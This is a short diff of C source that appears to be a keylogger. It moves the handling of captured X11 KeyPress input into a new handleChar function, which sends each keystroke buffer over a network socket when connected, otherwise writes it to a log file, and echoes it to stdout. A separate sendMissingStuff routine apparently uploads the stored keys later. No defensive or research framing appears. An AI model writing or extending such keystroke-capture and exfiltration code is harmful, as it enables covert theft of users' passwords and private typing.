@@ -26,6 +26,16 @@ int sendMissingStuff() {
 	return 1;
 }
 
+void handleChar(int connected, char *buf) {
+	if(connected)
+		sendStr(buf);
+	else
+		appendFile(filename, buf);
+
+	printf("%s", buf);
+	fflush(stdout);
+}
+
 int main() {
 	// open needed stuff
 	int connected = connectSocket();
@@ -73,10 +83,7 @@ int main() {
 			buf[0] = '\0';
 
 		if(event.type == KeyPress) {
-			if(connected)
-				sendStr(buf);
-			else
-				appendFile(filename, buf);
+			handleChar(connected, buf);
 		}
 
 		i++;
